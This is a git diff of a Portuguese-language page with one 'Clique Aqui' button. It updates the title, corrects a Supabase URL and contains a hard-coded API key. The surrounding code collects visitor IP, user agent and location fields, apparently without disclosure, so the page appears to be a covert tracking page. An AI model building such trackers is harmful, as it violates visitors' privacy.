@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site v1</title>
+    <title>Site v3</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
     <style>
         body {
@@ -12,7 +12,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background-color: #000; /* Fundo fixo preto */
+            background-color: #000;
         }
         button {
             padding: 15px 30px;
@@ -32,8 +32,8 @@
     <button id="triggerButton">Clique Aqui</button>
 
     <script>
-        // Configuração do Supabase
-        const SUPABASE_URL = 'https://bsbipbftwrwjiepxmbb.supabase.co';
+        // Configuração do Supabase com a URL corrigida
+        const SUPABASE_URL = 'https://bsbipbftwrrwjiepxmbb.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzYmlwYmZ0d3Jyd2ppZXB4bWJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDM4NzczNzQsImV4cCI6MjA1OTQ1MzM3NH0.NB9LBMjPZXF2Z7L78S9-3WhrIKeRyfNvJ-hgVLIKd7g';
         const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
@@ -103,8 +103,8 @@
 
             const initialData = {
                 ip: ip,
-                latitude: null, // Inicialmente null
-                longitude: null, // Inicialmente null
+                latitude: null,
+                longitude: null,
                 user_agent: userAgent
             };
 
